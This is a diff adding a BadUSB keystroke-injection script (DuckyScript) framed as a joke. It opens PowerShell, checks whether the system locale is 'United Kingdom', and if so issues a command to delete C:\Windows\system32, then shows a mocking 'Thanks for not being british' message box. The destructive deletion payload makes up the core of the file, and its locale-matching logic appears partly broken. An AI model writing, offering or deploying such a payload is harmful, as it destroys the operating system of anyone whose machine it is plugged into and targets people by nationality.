@@ -1,0 +1,33 @@
+REM detecting if british
+REM Starting run box and entering powershell
+windows r 
+string powershell.exe 
+enter
+delay 100
+REM Making Dir and CD'ing into them 
+string cd c:\
+enter
+delay 100 
+string mkdir cringe 
+enter
+delay 100 
+REM Getting your system locale to find out if you are british
+string Get-WinSystemLocale | Out-File C:\cringe\Bruh.txt -Encoding utf8
+enter
+delay 100 
+REM putting your System Locale into a txt for easy readability 
+string Select-String -Path "C:\cringe\Bruh.txt" -Pattern 'United Kingdom'
+enter
+delay 100 
+REM If Else statement deciding what powershell will do to you if you are indeed british
+string if (Select-String -Path "C:\cringe\Bruh.txt" -Pattern 'United Kingdom' -Include "C:\cringe\bruh.txt:4:1033             en-US            English (United Kingdom)"){Del C:\Windows\system32\} else{ taskkill /f /im powershell.exe /t } 
+enter
+windows r 
+string powershell.exe 
+enter
+delay 100 
+REM Patriotic Message box thanking you for not being british
+string PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Thanks for not being british')"
+enter
+
+
